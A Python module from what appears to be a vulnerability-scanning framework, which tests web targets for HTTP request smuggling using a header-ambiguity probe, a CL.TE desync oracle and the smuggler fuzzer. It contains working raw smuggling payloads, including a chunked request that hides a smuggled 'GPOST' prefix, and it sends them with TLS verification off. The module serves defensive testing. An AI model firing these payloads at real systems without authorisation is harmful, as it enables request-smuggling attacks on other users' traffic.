"""Stage 5: HTTP request smuggling, graded as what it actually is.

Pipeline: ambiguity pre-filter first (a server that 400-rejects dual
Content-Length/Transfer-Encoding headers cannot be desynced this way,
so smuggler never runs there), then a manual CL.TE desync oracle on one
socket (a smuggled prefix surfacing in the next response is proof),
then smuggler's fuzzer output recorded honestly as TENTATIVE candidates
for the ambiguous-but-unproven remainder.

Smuggling is a disagreement between a front-end proxy and a back-end
server about where one request ends and the next begins. Anything this
module emits without a desync stays TENTATIVE until a person has seen
it — the impact if real is severe, but the tool has not shown a desync
that survives scrutiny.
"""

import http.client
import re
import secrets
import socket
import ssl
from urllib.parse import urlparse

from modules.base import BaseModule
from tools.external import smuggler_scan, tool_available


class HTTPSmuggling(BaseModule):
    id = "http_smuggling"
    name = "HTTP Smuggling Scan"
    stage = 5
    detectability = "high"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        cfg = self._cfg()
        if cfg.get("enabled", True) is False:
            self.state.skip_module(self.id, "disabled in config")
            return "skipped"

        targets = self._targets()
        if not targets:
            targets = [self.base_url]

        if not tool_available("smuggler"):
            self.state.skip_module(self.id, "smuggler not installed")
            return "skipped"

        limit = int(cfg.get("max_targets", 10) or 10)
        confirmed = 0
        reported = 0
        for target in targets[:limit]:
            ambiguous, ambiguity_note = await self._ambiguous(target)
            if not ambiguous:
                self.log(f"  {target}: strict header handling "
                         f"({ambiguity_note}) — smuggler would be noise here")
                continue
            if await self._desync_oracle(target):
                confirmed += 1
                continue
            result = await smuggler_scan(target, timeout=300)
            hits = result.get("results", [])
            evidence_id = self.state.add_evidence(
                self.id, "smuggler", target,
                {"results": hits, "stdout": result.get("stdout", ""),
                 "exit_code": result.get("exit_code"),
                 "stderr": result.get("stderr", "")},
            )
            if hits:
                reported += len(hits)
                self.state.add_finding(
                    title=f"HTTP smuggling candidate: {target}",
                    # Unconfirmed. The impact if real is severe, but the tool
                    # has not shown a desync that survives scrutiny.
                    severity="MEDIUM",
                    confidence="TENTATIVE",
                    category="HTTP Request Smuggling",
                    description=(
                        f"smuggler returned {len(hits)} candidate line(s) for "
                        f"{target}. This is a fuzzer's output, not a confirmed "
                        "desync: a request-smuggling bug needs a front-end and "
                        "a back-end server that disagree on request boundaries, "
                        "and that has not been shown here. Reproduce it with a "
                        "controlled two-request sequence before treating it as "
                        "a finding — the impact if genuine is high, so it is "
                        "worth the hour."
                    ),
                    evidence=[str(hit) for hit in hits[:15]],
                    evidence_refs=[evidence_id],
                    remediation=(
                        "Normalise HTTP parsing between front end and back end: "
                        "reject ambiguous Content-Length/Transfer-Encoding "
                        "combinations, and use a single parser with identical "
                        "rules on both hops."
                    ),
                    verified=False,
                )

        self.state.complete_module(self.id)
        self.log(f"HTTP smuggling: {confirmed} desync-confirmed, "
                 f"{reported} unconfirmed candidates")
        return "done"

    def _cfg(self) -> dict:
        cfg = self.config.get("modules", {}).get(self.id, {})
        return cfg if isinstance(cfg, dict) else {}

    def _connection(self, url: str, timeout: int = 15):
        """One raw connection, plain or TLS. http.client sends both
        Content-Length and Transfer-Encoding as written — no
        normalization — which is exactly what the oracle needs."""
        parsed = urlparse(url)
        use_tls = (parsed.scheme or "http").lower() == "https"
        host = parsed.hostname or ""
        port = parsed.port or (443 if use_tls else 80)
        if use_tls:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            raw = socket.create_connection((host, port), timeout=timeout)
            sock = context.wrap_socket(raw, server_hostname=host)
        else:
            sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        return sock, host

    @staticmethod
    def _read_response(sock, timeout: int = 10) -> tuple:
        """Read one full HTTP response (head + declared body) off a socket.

        Consuming the body matters: leftover bytes would parse as a phantom
        extra response on the next read, and phantom responses are exactly
        what this oracle counts.
        """
        sock.settimeout(timeout)
        data = b""
        try:
            while b"\r\n\r\n" not in data and b"\n\n" not in data:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 65536:
                    break
        except (socket.timeout, OSError):
            pass
        text = data.decode("utf-8", errors="replace")
        match = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", text)
        status = int(match.group(1)) if match else 0
        length_match = re.search(r"content-length:\s*(\d+)", text, re.I)
        if length_match and status:
            want = int(length_match.group(1))
            sep = re.search(r"\r\n\r\n|\n\n", text)
            have = len(data) - (sep.end() if sep else len(data))
            try:
                while have < want:
                    chunk = sock.recv(min(4096, want - have))
                    if not chunk:
                        break
                    data += chunk
                    have += len(chunk)
            except (socket.timeout, OSError):
                pass
            text = data.decode("utf-8", errors="replace")
        return status, text

    async def _ambiguous(self, target: str) -> tuple:
        """Does the server accept dual Content-Length + Transfer-Encoding?

        A 400/501 rejection means strict parsing: smuggling through header
        ambiguity is off the table and running the fuzzer only produces
        noise. Returns (ambiguous, note). Runs in a thread: raw sockets
        block.
        """
        import asyncio as _asyncio

        def probe() -> tuple:
            try:
                sock, host = self._connection(target, timeout=12)
            except OSError as exc:
                return False, f"connect failed: {exc}"
            try:
                body = (f"POST {urlparse(target).path or '/'} HTTP/1.1\r\n"
                        f"Host: {host}\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: 7\r\n"
                        "Transfer-Encoding: chunked\r\n"
                        "Connection: close\r\n\r\n"
                        "0\r\n\r\n")
                sock.sendall(body.encode())
                status, _ = self._read_response(sock, timeout=10)
            except OSError as exc:
                return False, f"probe failed: {exc}"
            finally:
                try:
                    sock.close()
                except OSError:
                    pass
            if status in (400, 501, 505):
                return False, f"strict rejection (HTTP {status})"
            if status == 0:
                return False, "no response"
            return True, f"accepted dual headers (HTTP {status})"

        return await _asyncio.to_thread(probe)

    async def _desync_oracle(self, target: str) -> bool:
        """CL.TE desync proof on one socket.

        Sends an ambiguous request whose chunk stream hides a `GET
        /<random-404>` prefix, then a normal GET on the same socket. A
        front-end that frames by Content-Length forwards a fragment the
        back-end re-parses as a request start — and that ghost request's
        response (404, or our marker) surfaces where the real second
        response should be. That is a desync, not a guess.
        """
        import asyncio as _asyncio

        marker = f"hopefully404-{secrets.token_hex(4)}"

        def probe() -> tuple:
            try:
                sock, host = self._connection(target, timeout=20)
            except OSError as exc:
                return False, f"connect failed: {exc}"
            try:
                path = urlparse(target).path or "/"
                prefix = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n"
                          "Content-Length: 4\r\n"
                          "Transfer-Encoding: chunked\r\n"
                          "Connection: keep-alive\r\n\r\n"
                          "5c\r\n"
                          f"GPOST /{marker} HTTP/1.1\r\n"
                          "Content-Type: application/x-www-form-urlencoded\r\n"
                          "Content-Length: 15\r\n\r\n"
                          "x=1\r\n"
                          "0\r\n\r\n")
                normal = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                          "Connection: close\r\n\r\n")
                sock.sendall(prefix.encode() + normal.encode())
                first = self._read_response(sock, timeout=12)
                second = self._read_response(sock, timeout=12)
                third = self._read_response(sock, timeout=6)
            except OSError as exc:
                return False, f"socket failed: {exc}"
            finally:
                try:
                    sock.close()
                except OSError:
                    pass
            responses = [first, second, third]
            texts = " ".join(text for _, text in responses)
            if marker in texts:
                return True, "smuggled prefix answered as its own request"
            answered = [(status, text[:120]) for status, text in responses
                        if status]
            if len(answered) >= 3:
                return True, f"{len(answered)} responses for 2 requests"
            if len(answered) == 2 and answered[1][0] in (400, 404, 500):
                return True, (f"second response is HTTP {answered[1][0]} "
                               "for a healthy path — a ghost request jumped "
                               "the queue")
            return False, f"responses: {[status for status, _ in answered]}"

        try:
            proven, note = await _asyncio.wait_for(
                _asyncio.to_thread(probe), timeout=60)
        except Exception as exc:
            self.log(f"  desync oracle failed for {target}: {exc}")
            return False
        evidence_id = self.state.add_evidence(
            self.id, "desync_oracle", target,
            {"marker": marker, "result": note, "proven": proven},
        )
        if proven:
            self.state.add_finding(
                title=f"HTTP Request Desync Confirmed: {target}",
                severity="HIGH",
                confidence="CONFIRMED",
                category="HTTP Request Smuggling",
                description=(
                    f"A CL.TE desync oracle against {target} surfaced a "
                    f"ghost response ({note}). The front end and back end "
                    f"disagree on request boundaries: requests can be "
                    f"smuggled past the front end."
                ),
                evidence=[f"Target: {target}", f"Marker: {marker}",
                          f"Oracle: {note}"],
                evidence_refs=[evidence_id],
                remediation=(
                    "Normalise HTTP parsing between front end and back end: "
                    "reject ambiguous Content-Length/Transfer-Encoding "
                    "combinations, and use a single parser with identical "
                    "rules on both hops."
                ),
                verified=True,
                verification={"method": "cl_te_desync_oracle", "url": target},
            )
            self.log(f"  DESYNC CONFIRMED on {target} ({note})")
        return proven

    def _targets(self) -> list[str]:
        targets = []
        for asset_type in ("webapp", "url"):
            for asset in self.state.get_assets_by_type(asset_type):
                value = str(asset.get("value", "")).strip()
                if value.startswith(("http://", "https://")) and value not in targets:
                    targets.append(value)
        return targets
